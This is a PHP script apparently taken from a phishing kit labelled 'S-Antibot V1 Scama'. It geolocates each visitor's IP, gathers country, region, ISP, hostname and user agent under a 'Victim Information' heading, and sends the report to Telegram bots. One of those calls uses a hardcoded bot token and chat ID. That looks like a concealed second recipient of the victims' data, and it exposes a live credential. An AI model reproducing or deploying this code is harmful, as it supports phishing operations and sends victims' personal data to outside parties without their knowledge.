<?php error_reporting(0);
$tanitatikaram = parse_ini_file("../Anticonfig.ini", true);
$viewsToken = $tanitatikaram['viewsToken'];
$viewsChatID = $tanitatikaram['viewsChatID'];



$ip = getenv("REMOTE_ADDR");
$url = "http://ip-api.com/json/" . $ip;
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$resp = curl_exec($ch);
curl_close($ch);
$details = json_decode($resp, true);
$countryname = $details['country'];
$city = $details['city'];
$isp = $details['isp'];
$region = $details['regionName'];
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];


$message .= " Your S-Antibot V1 Scama Getting Visit \n"."\n";
$message .= " -------------- Victim Information-------------- \n"."\n";
$message.= "IP Address:$ip"."\n";
$message.= "COUNTRY:$countryname"."\n";
$message.= "REGION:{$region}"."\n";
$message.= "ORGANISATION:{$isp}"."\n";
$message.= "HOSTNAME:" . $hostname . ""."\n";
$message.= "USER AGENT:{$_SERVER['HTTP_USER_AGENT']}"."\n"."\n";

function callAPI($url) {
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
    $result = curl_exec($curl);
    curl_close($curl);
}
$result = urlencode($message);
callAPI('https://api.telegram.org/bot1770793269:AAHiJOahM2K5CpXNQUTwBgIZU9JOwoogGRY/sendMessage?chat_id=1023780706&text=' . $result . "&parse_mode=html");
callAPI('https://api.telegram.org/bot' . $viewsToken . '/sendMessage?chat_id=' . $viewsChatID . '&text=' . $result . "&parse_mode=html");